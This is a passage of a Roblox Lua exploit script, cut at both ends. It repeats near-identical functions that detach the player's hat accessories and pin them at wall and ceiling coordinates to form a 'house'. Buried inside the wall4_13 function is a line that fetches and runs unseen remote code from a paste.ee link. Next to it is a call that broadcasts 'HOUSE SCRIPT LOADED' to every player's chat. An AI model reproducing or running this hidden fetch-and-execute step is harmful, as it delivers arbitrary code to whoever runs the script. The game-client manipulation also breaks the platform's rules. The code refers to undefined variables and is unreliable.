	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c11"
local HAT = "c11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 8
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_12()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c12"
local HAT = "c12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 8
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_13()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c13"
local HAT = "c13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 8
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	--|| Settings:
local NetEnabled = true -- Keep this on true or this script is basically useless
--|| Script Loadstring:
loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()  
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("HOUSE SCRIPT LOADED",
	"All")
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_14()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c14"
local HAT = "c14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 8
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall4_15()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "c15"
local HAT = "c15"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -10
Yval.Value = 8
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing1()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing1"
local HAT = "cealing1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 9.5
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing2()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing2"
local HAT = "cealing2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 9.5
Zval.Value = -4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing3()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing3"
local HAT = "cealing3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 9.5
Zval.Value = 4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function cealing4()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing4"
local HAT = "cealing4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 9.5
Zval.Value = 8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing5()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing5"
local HAT = "cealing5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 9.5
Zval.Value = -8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing6()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing6"
local HAT = "cealing6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 9.5
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing7()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing7"
local HAT = "cealing7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 9.5
Zval.Value = -4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing8()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing8"
local HAT = "cealing8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 9.5
Zval.Value = 4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function cealing9()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing9"
local HAT = "cealing9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
